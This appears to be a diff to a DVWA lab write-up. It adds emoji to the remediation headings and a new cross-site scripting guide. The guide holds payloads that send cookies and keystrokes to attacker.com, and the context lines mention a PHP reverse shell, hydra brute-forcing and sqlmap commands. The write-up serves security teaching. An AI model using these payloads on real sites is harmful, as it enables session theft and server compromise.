@@ -93,7 +93,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 - No rate limiting
 - Weak passwords allowed
 
-## Remediation
+## 🛡️ Remediation
 - Implement account lockout
 - Enforce strong passwords
 - Add rate limiting
@@ -129,7 +129,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 - **Reverse Shell**: PHP backdoor to attacker IP `172.20.10.13:4444`
 - **Result**: Full system compromise with root access
 
-## Remediation
+## 🛡️ Remediation
 - Input validation and sanitization
 - Use of parameterized commands
 - Principle of least privilege
@@ -168,7 +168,7 @@ The password can be changed using the vuln request by modifying the parameters p
 - Full account takeover
 - No user interaction required
 
-## Remediation
+## 🛡️ Remediation
 - Implement CSRF tokens
 - Change GET to POST for state-changing operations
 - Add SameSite cookies and referrer validation
@@ -204,7 +204,7 @@ http://localhost/vulnerabilities/fi/?page=file1.php
 <img width="962" height="399" alt="image" src="https://github.com/user-attachments/assets/458f89b7-05d3-46a0-a5ec-de169e1938e7" />
 *Successful retrieval of /etc/passwd via path traversal*
 
-## Remediation
+## 🛡️ Remediation
 - Implement input validation
 - Use whitelist of allowed files
 - Restrict directory traversal characters
@@ -244,7 +244,7 @@ nc -nlvp 4444
 <img width="933" height="465" alt="image" src="https://github.com/user-attachments/assets/f73dc7de-19f2-4b3f-a844-8ab20a5cf022" />
 visit http://localhost/hackable/uploads/php-reverse-shell.php
 
-## Remediation
+## 🛡️ Remediation
 - Validate file content, not just headers
 - Implement file type verification
 - Restrict executable upload directories
@@ -286,7 +286,7 @@ sqlmap -r request.txt -p id --batch --technique=B --current-db
 ```
 
 **Note:** Save HTTP requests to `request.txt` before running SQLMap commands.
-# SQL Injection Remediation
+# 🛡️ SQL Injection Remediation
 
 ## Comprehensive Security Measures
 
@@ -320,4 +320,101 @@ $stmt->execute([$id]);
 
 **Remember:** Parameterized queries are the most effective defense against SQL injection attacks.
 
+# Cross-Site Scripting (XSS) Vulnerability Guide
 
+## 🔍 Understanding XSS Types
+
+### 1. Reflected XSS
+**How it works:** Malicious script is reflected off a web server in response to user input
+- **Attack vector:** URL parameters, form inputs, search fields
+- **Impact:** Steal sessions, redirect users, deface websites
+
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/59054ef5-b394-422b-95fc-5d994e8ffafe" />
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/c62a64ac-d773-4fd7-aa65-a54c538e5c11" />
+
+**Example Attack:**
+```http
+http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
+```
+
+### 2. Stored XSS
+**How it works:** Malicious script is stored on the server and executed when accessed
+- **Attack vector:** Comments, user profiles, forum posts, databases
+- **Impact:** Affects all users, persistent threat
+
+<img width="577" height="802" alt="image" src="https://github.com/user-attachments/assets/0df0bbf6-b19d-4123-8901-fae1f781ef78" />
+<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/9b3d3f35-1c5b-4d02-bb22-0d7fbba6321b" />
+
+**Example Attack:**
+```html
+<!-- Malicious comment stored in database -->
+<script>
+fetch('http://attacker.com/steal?cookie=' + document.cookie)
+</script>
+```
+
+### 3. DOM-based XSS
+**How it works:** Vulnerability exists in client-side code manipulating the DOM
+- **Attack vector:** URL fragments, client-side JavaScript
+- **Impact:** Client-side only, no server interaction needed
+
+<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/b22d543e-1951-46c6-b4f5-5c2de651d5f1" />
+<img width="958" height="893" alt="image" src="https://github.com/user-attachments/assets/6fc06e56-66d5-4fc4-8cb0-030b1f308742" />
+
+**Example Attack:**
+```javascript
+// Vulnerable code
+document.getElementById('output').innerHTML = window.location.hash.substring(1);
+// Attack: http://site.com#<img src=x onerror=stealCookies()>
+```
+
+## 🛠️ Common XSS Payloads
+
+### Basic Test Payloads
+```html
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(document.domain)>
+```
+
+### Advanced Attack Payloads
+```html
+<!-- Cookie theft -->
+<script>fetch('http://attacker.com/?c='+document.cookie)</script>
+
+<!-- Keylogger -->
+<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>
+
+<!-- CSRF attack -->
+<script>
+fetch('/change-email', {
+  method: 'POST',
+  body: 'email=attacker@evil.com'
+})
+</script>
+```
+
+---
+
+# 🛡️ XSS Remediation
+
+## Essential Protections
+
+**1. Input Validation**
+```php
+$clean = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+```
+
+**2. Security Headers**
+```http
+Content-Security-Policy: default-src 'self'
+X-XSS-Protection: 1; mode=block
+```
+
+**3. Safe Coding**
+- Validate all inputs
+- Encode all outputs
+- Use HTTPOnly cookies
+- Avoid `innerHTML`
+
+**Never trust user input - always validate and encode.**
